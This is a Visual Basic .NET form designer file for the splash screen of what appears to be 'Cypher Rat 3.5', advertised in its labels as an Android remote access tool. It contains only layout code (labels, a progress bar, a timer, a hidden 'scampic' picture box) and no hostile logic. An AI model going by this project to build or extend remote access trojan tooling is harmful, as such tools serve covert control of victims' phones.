<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class CHECKER
    Inherits System.Windows.Forms.Form
      <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub
      Private components As System.ComponentModel.IContainer
        <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.MainText = New System.Windows.Forms.Label()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.MetroSetProgressBar1 = New MetroSet_UI.Controls.MetroSetProgressBar()
        Me.MetroSetPanel1 = New MetroSet_UI.Controls.MetroSetPanel()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.scampic = New System.Windows.Forms.PictureBox()
        Me.MetroSetPanel1.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.scampic, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()



        Me.MainText.AutoSize = True
        Me.MainText.BackColor = System.Drawing.Color.Transparent
        Me.MainText.Font = New System.Drawing.Font("Palatino Linotype", 11.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.MainText.ForeColor = System.Drawing.Color.White
        Me.MainText.Location = New System.Drawing.Point(621, 310)
        Me.MainText.Name = "MainText"
        Me.MainText.Size = New System.Drawing.Size(14, 21)
        Me.MainText.TabIndex = 1
        Me.MainText.Text = "."



        Me.Timer1.Interval = 80



        Me.MetroSetProgressBar1.BackgroundColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.MetroSetProgressBar1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.MetroSetProgressBar1.DisabledBackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.MetroSetProgressBar1.DisabledBorderColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.MetroSetProgressBar1.DisabledProgressColor = System.Drawing.Color.FromArgb(CType(CType(120, Byte), Integer), CType(CType(65, Byte), Integer), CType(CType(177, Byte), Integer), CType(CType(225, Byte), Integer))
        Me.MetroSetProgressBar1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.MetroSetProgressBar1.IsDerivedStyle = True
        Me.MetroSetProgressBar1.Location = New System.Drawing.Point(0, 0)
        Me.MetroSetProgressBar1.Maximum = 100
        Me.MetroSetProgressBar1.Minimum = 0
        Me.MetroSetProgressBar1.Name = "MetroSetProgressBar1"
        Me.MetroSetProgressBar1.Orientation = MetroSet_UI.Enums.ProgressOrientation.Horizontal
        Me.MetroSetProgressBar1.ProgressColor = System.Drawing.Color.FromArgb(CType(CType(65, Byte), Integer), CType(CType(177, Byte), Integer), CType(CType(225, Byte), Integer))
        Me.MetroSetProgressBar1.Size = New System.Drawing.Size(795, 18)
        Me.MetroSetProgressBar1.Style = MetroSet_UI.Enums.Style.Dark
        Me.MetroSetProgressBar1.StyleManager = Nothing
        Me.MetroSetProgressBar1.TabIndex = 2
        Me.MetroSetProgressBar1.Text = "MetroSetProgressBar1"
        Me.MetroSetProgressBar1.ThemeAuthor = "Narwin"
        Me.MetroSetProgressBar1.ThemeName = "MetroDark"
        Me.MetroSetProgressBar1.Value = 0



        Me.MetroSetPanel1.BackgroundColor = System.Drawing.Color.White
        Me.MetroSetPanel1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MetroSetPanel1.BorderThickness = 1
        Me.MetroSetPanel1.Controls.Add(Me.MetroSetProgressBar1)
        Me.MetroSetPanel1.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.MetroSetPanel1.IsDerivedStyle = True
        Me.MetroSetPanel1.Location = New System.Drawing.Point(0, 391)
        Me.MetroSetPanel1.Name = "MetroSetPanel1"
        Me.MetroSetPanel1.Size = New System.Drawing.Size(795, 18)
        Me.MetroSetPanel1.Style = MetroSet_UI.Enums.Style.Light
        Me.MetroSetPanel1.StyleManager = Nothing
        Me.MetroSetPanel1.TabIndex = 3
        Me.MetroSetPanel1.ThemeAuthor = "Narwin"
        Me.MetroSetPanel1.ThemeName = "MetroLite"



        Me.Label1.AutoSize = True
        Me.Label1.BackColor = System.Drawing.Color.Transparent
        Me.Label1.Font = New System.Drawing.Font("Palatino Linotype", 75.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(95, Byte), Integer), CType(CType(95, Byte), Integer), CType(CType(250, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(58, 170)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(725, 135)
        Me.Label1.TabIndex = 4
        Me.Label1.Text = "Cypher Rat 3.5"



        Me.Label2.BackColor = System.Drawing.Color.Transparent
        Me.Label2.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.Label2.Font = New System.Drawing.Font("Roboto", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.DarkTurquoise
        Me.Label2.Location = New System.Drawing.Point(0, 346)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(795, 45)
        Me.Label2.TabIndex = 5
        Me.Label2.Text = "....."



        Me.Label3.AutoSize = True
        Me.Label3.BackColor = System.Drawing.Color.Transparent
        Me.Label3.Font = New System.Drawing.Font("Palatino Linotype", 10.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.ForeColor = System.Drawing.Color.White
        Me.Label3.Location = New System.Drawing.Point(499, 293)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(284, 38)
        Me.Label3.TabIndex = 6
        Me.Label3.Text = "The Most Advanced Android Remote Tool." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "By Original EVLF"



        Me.PictureBox1.BackColor = System.Drawing.Color.Transparent
        Me.PictureBox1.Location = New System.Drawing.Point(0, 3)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(795, 164)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.PictureBox1.TabIndex = 7
        Me.PictureBox1.TabStop = False



        Me.scampic.Location = New System.Drawing.Point(0, 3)
        Me.scampic.Name = "scampic"
        Me.scampic.Size = New System.Drawing.Size(795, 340)
        Me.scampic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom
        Me.scampic.TabIndex = 8
        Me.scampic.TabStop = False
        Me.scampic.Visible = False



        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom
        Me.ClientSize = New System.Drawing.Size(795, 409)
        Me.Controls.Add(Me.scampic)
        Me.Controls.Add(Me.MainText)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.MetroSetPanel1)
        Me.DoubleBuffered = True
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "CHECKER"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.MetroSetPanel1.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.scampic, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents MainText As Label
    Friend WithEvents Timer1 As Timer
    Friend WithEvents MetroSetProgressBar1 As MetroSet_UI.Controls.MetroSetProgressBar
    Friend WithEvents MetroSetPanel1 As MetroSet_UI.Controls.MetroSetPanel
    Friend WithEvents Label1 As Label
    Friend WithEvents Label2 As Label
    Friend WithEvents Label3 As Label
    Friend WithEvents PictureBox1 As PictureBox
    Public WithEvents scampic As PictureBox
End Class
